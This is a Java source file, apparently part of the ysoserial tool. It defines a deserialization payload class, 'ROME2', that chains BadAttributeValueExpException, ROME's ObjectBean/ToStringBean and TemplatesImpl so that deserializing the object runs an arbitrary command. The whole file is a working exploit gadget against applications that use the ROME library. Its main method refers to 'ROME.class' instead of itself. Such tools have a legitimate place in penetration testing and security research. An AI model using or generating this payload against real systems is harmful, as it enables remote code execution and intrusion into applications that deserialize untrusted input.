package ysoserial.payloads;

import com.sun.syndication.feed.impl.ObjectBean;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;
import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;

/**
 * @author:Firebasky
 * BadAttributeValueExpException.readObject()
 *    ToStringBean.toString()
 *        TemplatesImpl.getOutputProperties()
 */

@Dependencies("rome:rome:1.0")
@Authors({ Authors.Firebasky })
public class ROME2 implements ObjectPayload<Object> {

    public Object getObject ( String command ) throws Exception {

        Object o = Gadgets.createTemplatesImpl(command);
        ObjectBean delegate = new ObjectBean(Templates.class, o);
        BadAttributeValueExpException b = new BadAttributeValueExpException ("");
        Reflections.setFieldValue (b, "val", delegate);
        return b;
    }

    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(ROME.class, args);
    }

}
